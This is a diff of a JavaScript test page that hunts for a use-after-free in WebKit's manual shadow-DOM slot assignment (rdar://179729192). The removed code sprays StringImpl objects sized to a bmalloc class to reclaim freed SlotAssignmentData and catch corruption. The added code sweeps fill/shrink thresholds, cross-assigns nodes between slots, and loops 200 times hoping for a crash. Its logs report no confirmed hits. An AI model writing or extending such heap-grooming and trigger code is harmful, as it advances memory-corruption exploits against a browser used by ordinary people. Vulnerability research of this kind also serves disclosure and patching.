-  log('║  C: ASYNC-TRIGGER · lazy resolution window test              ║','hi');
+  log('║  PATH-B: DOM removal → dead key GC → shrink-rehash           ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-  log('  Can we create a window between DOM mutation and slot resolution?','inf');
-  log('  If yes: spray BETWEEN mutation (bucket freed) and resolution (bucket read).','inf');
+  log('  Fill WeakHashMap → remove DOM nodes → WeakPtrs die → access → shrink','inf');
   log('');
 
   const configs = [
-    // Method 1: mutate + spray + force layout (standard)
-    { label:'M1-std',    charLen:48, delay:0,   method:'std' },
-    // Method 2: mutate + microtask-delay + spray + force layout
-    { label:'M2-tick',   charLen:48, delay:'tick', method:'tick' },
-    // Method 3: mutate + raf + spray + force layout (next frame)
-    { label:'M3-raf',    charLen:48, delay:'raf',  method:'raf' },
-    // Method 4: mutate + 10ms + spray + force layout
-    { label:'M4-10ms',   charLen:48, delay:10,   method:'ms' },
+    // fill=9, remove=8 → dead=8, live=1 → 1/16 < 1/8 → shrink if cleanup runs
+    { label:'B09-r8-rd',   fill:9,  remove:8,  method:'read' },
+    { label:'B09-r8-ae',   fill:9,  remove:8,  method:'assign-empty' },
+    { label:'B09-r8-an',   fill:9,  remove:8,  method:'assign-new' },
+    // fill=17, remove=14 → dead=14, live=3 → 3/32 < 1/8 → shrink
+    { label:'B17-r14-rd',  fill:17, remove:14, method:'read' },
+    { label:'B17-r14-ae',  fill:17, remove:14, method:'assign-empty' },
+    { label:'B17-r14-an',  fill:17, remove:14, method:'assign-new' },
+    { label:'B17-r14-fr',  fill:17, remove:14, method:'force-resolution' },
+    // fill=33, remove=26 → dead=26, live=7 → 7/64 < 1/8 → shrink
+    { label:'B33-r26-rd',  fill:33, remove:26, method:'read' },
+    { label:'B33-r26-ae',  fill:33, remove:26, method:'assign-empty' },
+    { label:'B33-r26-an',  fill:33, remove:26, method:'assign-new' },
+    { label:'B33-r26-fr',  fill:33, remove:26, method:'force-resolution' },
+    // fill=65, remove=58 → dead=58, live=7 → 7/128 < 1/8 → shrink (biggest map)
+    { label:'B65-r58-rd',  fill:65, remove:58, method:'read' },
+    { label:'B65-r58-an',  fill:65, remove:58, method:'assign-new' },
+    { label:'B65-r58-fr',  fill:65, remove:58, method:'force-resolution' },
   ];
 
   const sums = [];
   for(const c of configs){
-    const r = await probeAsyncTrigger(c.label, c.charLen, c.delay);
-    log(`  [${c.label}] ${r.sig}`, r.hit?'hit':'ok');
+    const r = await probePathB(c.label, c.fill, c.remove, c.method);
+    log(`  ${r.sig}`, r.hit?'hit':'ok');
     sums.push(r);
-    await delay(30);
+    await delay(20);
   }
 
   log('');
-  log('  KEY: if any method shows spray-corrupt → lazy resolution window exists.','inf');
-  log('  If ALL show spray-ok → slot resolution is ALWAYS synchronous.','inf');
+  const hits = sums.filter(r=>r.hit);
+  if(hits.length){
+    log(`  !! ${hits.length} hits on PATH-B`, 'hit');
+    for(const r of hits) log(`  ${r.sig}`, 'hit');
+  } else {
+    log('  0 signals — no dead-key shrink UAF triggered', 'inf');
+  }
   dis(false);
 }
 
-async function probeAsyncTrigger(label, charLen, delaySpec){
-  const rig = makeRig(label, 4, true);
-  // Pre-spray (exists before trigger mutation)
-  const preSpray = [];
-  const frag = document.createDocumentFragment();
-  const base = 'X'.repeat(charLen);
-  for(let i=0; i<32; i++){
-    const el = document.createElement('span');
-    el.textContent = base + String(i).padStart(4,'0');
-    preSpray.push(el);
-    frag.appendChild(el);
+// ─────────────────────────────────────────────────────────────────────────────
+// PATH C: Cross-assign forced reassignment
+//
+// If two slots in the SAME shadow root both try to assign the SAME child node:
+//   shadow root has slotA and slotB (manual mode)
+//   slotA.assign([child]) → WeakHashMap: child → slotA
+//   slotB.assign([child]) → WebKit must remove child from slotA, add to slotB
+//     → During this operation, is the WeakHashMap iterated while modified?
+//     → If yes, and if the modification causes rehash → UAF
+//
+// Also test: calling slot.assign() recursively via a slotchange handler
+//   → slotA.assign() fires slotchange event
+//   → In slotchange handler: call slotB.assign() which modifies same WeakHashMap
+//   → If slotA.assign() is mid-iteration when slotB.assign() runs → UAF
+//
+// Note: slotchange on manual slots fires synchronously or as microtask?
+//   Per spec: should be queued (microtask). But let's test.
+// ─────────────────────────────────────────────────────────────────────────────
+async function probePathC(label, numChildren, useMutationInHandler){
+  const host = document.createElement('div');
+  host.style.cssText='display:block;width:80px;height:20px;';
+  let sr;
+  try {
+    sr = host.attachShadow({mode:'open', slotAssignment:'manual'});
+  } catch(e){
+    return {sig:`NO-MANUAL-SLOT:${e.message}`, hit:false};
   }
-  RIG.appendChild(frag);
-  void RIG.getBoundingClientRect();
-
-  // DOM MUTATION: Add new named slot — this should schedule slot assignment
-  const s3 = document.createElement('slot'); s3.name='primary';
-  rig.sr.insertBefore(s3, rig.slot1);
-  // DO NOT force layout yet — maybe resolution is still deferred
-
-  // DELAY (try to create a window)
-  if(delaySpec === 'tick') await tick();
-  else if(delaySpec === 'raf') await raf();
-  else if(typeof delaySpec === 'number' && delaySpec > 0) await delay(delaySpec);
-  // else: no delay
-
-  // Post-mutation spray (may land in freed bucket if resolution was deferred)
-  const postSpray = [];
-  const frag2 = document.createDocumentFragment();
-  for(let i=0; i<32; i++){
-    const el = document.createElement('span');
-    el.textContent = base + String(i+100).padStart(4,'0');
-    postSpray.push(el);
-    frag2.appendChild(el);
+  const slotA = document.createElement('slot'); slotA.name='a';
+  const slotB = document.createElement('slot'); slotB.name='b';
+  sr.appendChild(slotA);
+  sr.appendChild(slotB);
+  const children = [];
+  for(let i=0; i<numChildren; i++){
+    const n = document.createElement('span');
+    n.textContent = `x${i}`;
+    host.appendChild(n);
+    children.push(n);
   }
-  RIG.appendChild(frag2);
+  RIG.appendChild(host);
+  void host.getBoundingClientRect();
 
-  // NOW force layout → triggers slot assignment resolution (if deferred)
-  void rig.host.getBoundingClientRect();
+  let threw = false, threwMsg='';
+  let scA=0, scB=0;
+  const sigs = [];
+
+  if(useMutationInHandler){
+    // Recursive: slotA.assign fires slotchange → in handler, call slotB.assign
+    // This happens DURING slot resolution processing
+    slotA.addEventListener('slotchange', ()=>{
+      scA++;
+      if(scA === 1){
+        try{
+          // This modifies the WeakHashMap while slotA's assignment is being processed
+          slotB.assign(children.slice(0, Math.floor(numChildren/2)));
+        } catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-sc-assign-threw`); }
+      }
+    });
+  }
+
+  // Fill slotA with ALL children
+  try {
+    slotA.assign(children);
+  } catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-fillA-threw`); }
+  void host.getBoundingClientRect();
+
+  if(!threw){
+    // Now steal half of them for slotB → should trigger removal from slotA's assignment
+    // and modify the WeakHashMap while potentially iterating
+    try {
+      slotB.assign(children.slice(0, Math.floor(numChildren/2)));
+    } catch(e){ threw=true; threwMsg=e.message; noteUAF(`${label}-fillB-threw`); }
+    void host.getBoundingClientRect();
+  }
 
   return new Promise(resolve => {
-    setTimeout(() => {
-      const expected = charLen + 4;
-      let preOk=0, preCorrupt=0, postOk=0, postCorrupt=0;
-      for(const el of preSpray){
-        try{ const t=el.textContent; (t&&t.length===expected&&t[0]==='X')?preOk++:preCorrupt++; }
-        catch(e){ preCorrupt++; noteUAF(`${label}-pre-threw`); }
-      }
-      for(const el of postSpray){
-        try{ const t=el.textContent; (t&&t.length===expected&&t[0]==='X')?postOk++:postCorrupt++; }
-        catch(e){ postCorrupt++; noteUAF(`${label}-post-threw`); }
-      }
-      // Cleanup
-      [...preSpray,...postSpray].forEach(el=>{ if(el.parentNode) el.parentNode.removeChild(el); });
-      try{ RIG.removeChild(rig.host); }catch(_){}
+    setTimeout(()=>{
+      let aLen=-1, bLen=-1;
+      try{ aLen=slotA.assignedElements().length; }catch(e){ aLen=-999; noteUAF(`${label}-aLen-threw`); }
+      try{ bLen=slotB.assignedElements().length; }catch(e){ bLen=-999; noteUAF(`${label}-bLen-threw`); }
+      if(threw) sigs.push(`THREW:${threwMsg.substring(0,50)}`);
+      sigs.push(`a=${aLen} b=${bLen}`);
 
-      let postLen=-1;
-      try{ postLen=rig.slot1.assignedNodes().length; }catch(e){ postLen=-999; }
-
-      const sig = [
-        `delay=${delaySpec}`,
-        `pre:${preOk}ok/${preCorrupt}c`,
-        `post:${postOk}ok/${postCorrupt}c`,
-        postLen===0?'post=0':postLen===-999?'post=THREW':`post=${postLen}`,
-      ].join(' | ');
-      const hit = preCorrupt>0||postCorrupt>0||postLen===-999;
-      if(hit) noteUAF(`${label}-WINDOW-FOUND:pre-c=${preCorrupt}+post-c=${postCorrupt}`);
-      resolve({ sig, hit });
+      try{ RIG.removeChild(host); }catch(_){}
+      const anyHit = threw||aLen===-999||bLen===-999;
+      const sig = `[${label}] n=${numChildren} handler=${useMutationInHandler} | ${sigs.join(' | ')}`;
+      resolve({sig, hit:anyHit, threw});
     }, 100);
   });
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// D: SAD-SIZE — SlotAssignmentData size probe
-// SlotAssignmentData has:
-//   assignedNodes: Vector<WeakPtr<Node>> (24B on 64-bit: ptr+size+capacity)
-//   element: WeakPtr<HTMLSlotElement>   (8B)
-//   oldElement: WeakPtr<HTMLSlotElement> (8B)
-//   candidates: ...?
-//   Total: likely 40-48B → bmalloc class 64B (rounds up to power-of-2 ≥ size)
-//
-// We can infer the size class by grooming: pre-allocate N objects of size X,
-// trigger N SlotAssignmentData allocs, free them all, then see which size
-// class has exactly N freed chunks available.
-//
-// Simpler: spray many StringImls at specific sizes, trigger many SlotAssignmentData
-// allocs+frees. After freeing SlotAssignmentData, check if any StringImls at
-// that size get corrupted (would happen if SlotAssignmentData was in same class).
-//
-// charLen for sizes:
-//   16B: too small for StringImpl header (32B min)
-//   32B: charLen=0 (header only, no chars)
-//   48B: charLen=8 → 32+16=48B
-//   64B: charLen=16 → 32+32=64B
-//   96B: charLen=32 → 32+64=96B
-// ─────────────────────────────────────────────────────────────────────────────
-
-async function runSADSize(){
-  dis(true); uafTotal=0; L.innerHTML='';
+async function runPathC(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  D: SAD-SIZE · SlotAssignmentData size class probe           ║','hi');
+  log('║  PATH-C: cross-assign (same node → two slots)               ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-  log('  SlotAssignmentData estimated: ~40-48B → bmalloc class 64B','inf');
-  log('  Test: post-UAF, does any size class StringImpl show corruption?','inf');
-  log('  UAF writes: offset 0=null, 8=null, 12=null, 16=ptr, 32=null','inf');
-  log('  If StringImpl at same class as SlotAssignmentData: m_data overwritten','inf');
-  log('  If m_data overwritten: textContent.length will be wrong or crash','inf');
+  log('  Two manual slots in same shadow root. Assign same nodes to both.','inf');
+  log('  WebKit must update WeakHashMap entries for shared nodes.','inf');
+  log('  Also test: slotchange handler re-assigns during slot resolution.','inf');
   log('');
 
-  // For each size: create many rigs, trigger UAF, check if spray at this size
-  // shows any corruption AFTER the UAF fires (but checked in setTimeout = after SC)
-  const sizes = [
-    { charLen:0,  bytes:32, label:'32B' },
-    { charLen:8,  bytes:48, label:'48B' },
-    { charLen:16, bytes:64, label:'64B' },
-    { charLen:32, bytes:96, label:'96B' },
-    { charLen:48, bytes:128, label:'128B' },
+  const configs = [
+    {label:'C4-noh', n:4,  handler:false},
+    {label:'C8-noh', n:8,  handler:false},
+    {label:'C16-noh',n:16, handler:false},
+    {label:'C32-noh',n:32, handler:false},
+    {label:'C4-h',   n:4,  handler:true},
+    {label:'C8-h',   n:8,  handler:true},
+    {label:'C16-h',  n:16, handler:true},
+    {label:'C32-h',  n:32, handler:true},
   ];
 
   const sums = [];
-  for(const s of sizes){
-    if(s.charLen === 0){
-      log(`── ${s.label} SKIP (charLen=0) ──`,'dim');
-      continue;
-    }
-    const r = await probeSADSize(s.label, s.charLen);
-    log(`  [${s.label}] ${r.sig}`, r.hit?'hit':'ok');
-    sums.push({...r, bytes:s.bytes});
-    await delay(30);
+  for(const c of configs){
+    const r = await probePathC(c.label, c.n, c.handler);
+    log(`  ${r.sig}`, r.hit?'hit':'ok');
+    sums.push(r);
+    await delay(20);
   }
 
   log('');
-  log('  If any size shows hit → SlotAssignmentData is in that bmalloc class.','inf');
-  log('  This tells us the exact size to spray for SlotAssignmentData reclaim.','inf');
+  const hits = sums.filter(r=>r.hit);
+  if(hits.length){
+    log(`  !! ${hits.length} hits on PATH-C`, 'hit');
+    for(const r of hits) log(`  ${r.sig}`, 'hit');
+  } else {
+    log('  0 signals', 'inf');
+  }
   dis(false);
 }
 
-async function probeSADSize(label, charLen){
-  const rig = makeRig(`sad${label}`, 4, true);
+// ─────────────────────────────────────────────────────────────────────────────
+// PATH D: Systematic grow+shrink sweep
+// Find the EXACT threshold where the UAF fires.
+// Try ALL combinations of fill/remove within the dangerous zone.
+// ─────────────────────────────────────────────────────────────────────────────
+async function probePathDSingle(fill, keep, method){
+  const rig = makeManualRig(`d${fill}k${keep}`, fill + 2);
+  if(!rig) return null;
 
-  // Spray BEFORE trigger — we want to RECLAIM freed SlotAssignmentData
-  // For that: create spray, THEN somehow free SlotAssignmentData, THEN trigger.
-  // But we can't directly free SlotAssignmentData from JS...
-  //
-  // APPROACH: trigger the UAF → SlotAssignmentData is now "corrupted" (null-written)
-  // Does the slot ever GET freed? Only if the shadow root is destroyed or the slot removed.
-  // After trigger, REMOVE the slot → SlotAssignmentData freed → spray may reclaim it
-  // → If spray reclaimed it, the freed SlotAssignmentData's memory now belongs to our StringImpl
-  // → The UAF writes already happened (before we freed it), so no new writes
-  // → But: if we re-trigger the UAF on a NEW rig and SlotAssignmentData got reclaimed...
-  //
-  // Actually the useful order is:
-  // 1. Trigger UAF (so m_slots rehash happens, old buckets freed)
-  // 2. REMOVE slot from shadow root → slot's SlotAssignmentData freed
-  // 3. Spray at SAD size → reclaim freed SAD
-  // 4. Trigger ANOTHER UAF on a DIFFERENT rig
-  //    → If that rig's SlotAssignmentData is adjacent/reclaimed to our spray?
-  //    → No, it gets a new SlotAssignmentData, not our spray.
-  //
-  // SIMPLEST TEST: just trigger, remove slot, spray, check spray.
-  // If slotchange fires and writes to a spray object that was at SAD location → hit.
+  let threw=false, threwMsg='';
 
-  // Pre-trigger
-  let trigThrew = false;
-  try {
-    const s3 = document.createElement('slot'); s3.name='primary';
-    rig.sr.insertBefore(s3, rig.slot1);
+  // Fill
+  try{ rig.slot.assign(rig.children.slice(0,fill)); }
+  catch(e){ threw=true; threwMsg=e.message; }
+
+  if(!threw){
     void rig.host.getBoundingClientRect();
-  } catch(e){ trigThrew=true; noteUAF(`${label}-trig-threw`); }
-
-  // Remove slot1 → its SlotAssignmentData may get freed
-  if(rig.slot1.parentNode === rig.sr) rig.sr.removeChild(rig.slot1);
-  void rig.host.getBoundingClientRect();
-
-  // Post-free spray — may reclaim freed SAD memory
-  const spray = [];
-  const frag = document.createDocumentFragment();
-  const base = 'X'.repeat(charLen);
-  for(let i=0; i<64; i++){
-    const el = document.createElement('span');
-    el.textContent = base + String(i).padStart(4,'0');
-    spray.push(el);
-    frag.appendChild(el);
-  }
-  RIG.appendChild(frag);
-  void RIG.getBoundingClientRect();
-
-  // Trigger a SECOND UAF (on a rig that still has a valid SAD at same class)
-  const rig2 = makeRig(`sad2${label}`, 4, true);
-  try {
-    const s4 = document.createElement('slot'); s4.name='primary';
-    rig2.sr.insertBefore(s4, rig2.slot1);
-    void rig2.host.getBoundingClientRect();
-  } catch(e){ noteUAF(`${label}-rig2-trig-threw`); }
-
-  return new Promise(resolve => {
-    setTimeout(() => {
-      const expected = charLen + 4;
-      let ok=0, corrupt=0, threw=0;
-      const corruptIdx=[];
-      for(let i=0; i<spray.length; i++){
-        try {
-          const t = spray[i].textContent;
-          (t && t.length===expected && t[0]==='X')? ok++ : (corrupt++,corruptIdx.push(i));
-        } catch(e){ threw++; corruptIdx.push(i); noteUAF(`${label}-spray-threw`); }
+    // Remove children to create dead entries (for GC path)
+    if(method==='dom-remove'){
+      for(let i=keep; i<fill && i<rig.children.length; i++){
+        if(rig.children[i].parentNode) rig.children[i].parentNode.removeChild(rig.children[i]);
       }
-      // Cleanup
-      spray.forEach(el=>{ if(el.parentNode) el.parentNode.removeChild(el); });
+      await tick();
+      // Access to trigger cleanup
+      try{ void rig.slot.assignedElements(); }catch(e){ threw=true; threwMsg=e.message; }
+    } else {
+      // Direct: assign only keep nodes
+      try{ rig.slot.assign(rig.children.slice(0,keep)); }
+      catch(e){ threw=true; threwMsg=e.message; }
+    }
+    void rig.host.getBoundingClientRect();
+  }
+
+  return new Promise(resolve=>{
+    setTimeout(()=>{
+      let post=-1;
+      try{ post=rig.slot.assignedElements().length; }
+      catch(e){ post=-999; threw=true; noteUAF(`D${fill}k${keep}-post-threw`); }
       try{ RIG.removeChild(rig.host); }catch(_){}
-      try{ RIG.removeChild(rig2.host); }catch(_){}
-
-      const sig = [
-        `charLen=${charLen}`,
-        `ok=${ok} corrupt=${corrupt} threw=${threw}`,
-        corrupt>0||threw>0? `idx=[${corruptIdx.slice(0,5).join(',')}]` : '',
-      ].filter(Boolean).join(' | ');
-
-      const hit = corrupt>0||threw>0;
-      if(hit) noteUAF(`${label}-SAD-CLASS-HIT:corrupt=${corrupt}`);
-      resolve({ sig, hit });
-    }, 100);
+      const hit = threw||post===-999;
+      if(hit) noteUAF(`D${fill}k${keep}m${method}-HIT`);
+      resolve({fill, keep, method, threw, post, hit});
+    }, 50);
   });
 }
 
-// ─────────────────────────────────────────────────────────────────────────────
-// E: LOOP ×200 — crash-pressure method, repeated
-// Watch for any run where the CRASH actually fires (page reload = victory)
-// ─────────────────────────────────────────────────────────────────────────────
-
-async function runLoop(){
-  dis(true); uafTotal=0; L.innerHTML='';
+async function runPathD(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  E: LOOP ×200 · crash-pressure + async trigger stress        ║','hi');
+  log('║  PATH-D: grow+shrink sweep · all threshold combinations      ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
-  log('  200 rounds of M3-raf (next-frame spray) looking for lazy window','inf');
+  log('');
+
+  // Sweet spot configs around each capacity threshold
+  // cap=16: fill=9..15, keep=0..1
+  // cap=32: fill=17..31, keep=0..3
+  // cap=64: fill=33..63, keep=0..7
+  const batch = [];
+  for(let fill=2; fill<=40; fill+=1){
+    for(let keep=0; keep<=Math.min(fill-1, 8); keep++){
+      batch.push({fill, keep, method:'direct'});
+      batch.push({fill, keep, method:'dom-remove'});
+    }
+  }
+
+  log(`  Running ${batch.length} configs (fill=2..40, keep=0..8, both methods)...`, 'dim');
+  let ok=0, hit=0;
+  const hits=[];
+
+  for(const c of batch){
+    const r = await probePathDSingle(c.fill, c.keep, c.method);
+    if(!r) continue;
+    if(r.hit){ hit++; hits.push(r); }
+    else ok++;
+  }
+
+  log('');
+  log(`  DONE: ok=${ok} hit=${hit}`, hit>0?'hit':'ok');
+  if(hits.length){
+    log(`  HIT CONFIGS:`, 'hit');
+    for(const r of hits){
+      log(`    fill=${r.fill} keep=${r.keep} method=${r.method} threw=${r.threw} post=${r.post}`, 'hit');
+    }
+  } else {
+    log('  0 signals across all threshold combinations', 'inf');
+    log('  ManualSlot WeakHashMap shrink does not trigger UAF via these paths', 'dim');
+    log('  Possible: rdar://179729192 requires a specific internal iteration path', 'dim');
+    log('  that is not triggered by slot.assign() or simple DOM removal.', 'dim');
+  }
+  dis(false);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// LOOP ×200 — best config from path D / A sweep
+// ─────────────────────────────────────────────────────────────────────────────
+async function runLoop(){
+  if(!_inRunAll){ dis(true); uafTotal=0; L.innerHTML=''; }
+  log('╔══════════════════════════════════════════════════════════════╗','hi');
+  log('║  LOOP ×200 · ManualSlot fill+shrink stress                   ║','hi');
+  log('╚══════════════════════════════════════════════════════════════╝','hi');
+  log('');
+  log('  Testing fill=33 keep=0 direct (best shrink-trigger config)','inf');
   log('');
 
   let ok=0, hit=0;
   for(let i=0; i<200; i++){
-    // Use raf method (most likely to create a timing window)
-    const r = await probeAsyncTrigger(`lp${i}`, 48, 'raf');
+    const r = await probePathA(`lp${i}`, 33, 0);
     if(r.hit) hit++;
     else ok++;
-
     if(i%50===49){
       log(`  ${i+1}/200: ok=${ok} hit=${hit} uaf=${uafTotal}`, hit>0?'hit':'dim');
       await tick();
@@ -695,37 +684,43 @@ async function runLoop(){
 
   log('');
   log(`  DONE 200: ok=${ok} hit=${hit} uaf=${uafTotal}`, hit>0?'hit':'ok');
-  if(hit > 0) log('  LAZY WINDOW CONFIRMED: spray landed before slot resolution', 'hit');
-  else log('  No lazy window found: slot resolution always synchronous with trigger', 'inf');
+  if(hit>0) log('  ManualSlot shrink UAF confirmed!', 'hit');
+  else log('  0 signals — ManualSlot shrink path not triggering UAF', 'inf');
   dis(false);
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
 // RUN ALL
 // ─────────────────────────────────────────────────────────────────────────────
-
 async function runAll(){
+  _inRunAll = true;
   dis(true); L.innerHTML=''; uafTotal=0;
   log('╔══════════════════════════════════════════════════════════════╗','hi');
-  log('║  v97 RUN ALL                                                  ║','hi');
+  log('║  v98 RUN ALL · ManualSlot WeakHashMap UAF rdar://179729192   ║','hi');
   log('╚══════════════════════════════════════════════════════════════╝','hi');
   log('');
-
-  log('━━━━━━━━━━━━ A: SC-TIMING ━━━━━━━━━━━━','hi');
-  await runSCTiming();
+  log('━━━━━━━━━━━━ PATH-A ━━━━━━━━━━━━','hi');
+  await runPathA();
   log('');
-  log('━━━━━━━━━━━━ B: CRASH-PRESSURE ━━━━━━━━━━━━','hi');
-  await runCrashPressure();
+  log('━━━━━━━━━━━━ PATH-B ━━━━━━━━━━━━','hi');
+  await runPathB();
   log('');
-  log('━━━━━━━━━━━━ C: ASYNC-TRIGGER ━━━━━━━━━━━━','hi');
-  await runAsyncTrigger();
+  log('━━━━━━━━━━━━ PATH-C ━━━━━━━━━━━━','hi');
+  await runPathC();
   log('');
-  log('━━━━━━━━━━━━ D: SAD-SIZE ━━━━━━━━━━━━','hi');
-  await runSADSize();
+  log('━━━━━━━━━━━━ PATH-D sweep ━━━━━━━━━━━━','hi');
+  await runPathD();
   log('');
-  log('━━━━━━━━━━━━ E: LOOP ×200 ━━━━━━━━━━━━','hi');
+  log('━━━━━━━━━━━━ LOOP ×200 ━━━━━━━━━━━━','hi');
   await runLoop();
+  log('');
+  log(`══════════════════════════════════════════════════════════════`,'hi');
+  log(`  RUN ALL COMPLETE · total UAF signals: ${uafTotal}`,'hi');
+  log(`══════════════════════════════════════════════════════════════`,'hi');
+  _inRunAll = false;
   dis(false);
+  // auto-copy the full unified log
+  copyLog();
 }
 </script>
 </body>
